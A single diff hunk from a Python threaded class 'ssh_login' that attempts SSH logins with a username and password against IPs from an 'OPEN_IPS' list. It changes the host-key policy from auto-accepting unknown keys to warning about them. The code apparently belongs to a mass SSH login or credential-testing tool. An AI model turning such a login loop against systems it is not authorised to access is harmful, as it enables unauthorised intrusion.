@@ -158,7 +158,7 @@ class ssh_login(Thread):
         global OPEN_IPS
         s = paramiko.SSHClient()
         s.load_system_host_keys()
-        s.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+        s.set_missing_host_key_policy(paramiko.WarningPolicy)
 
         try:
             s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
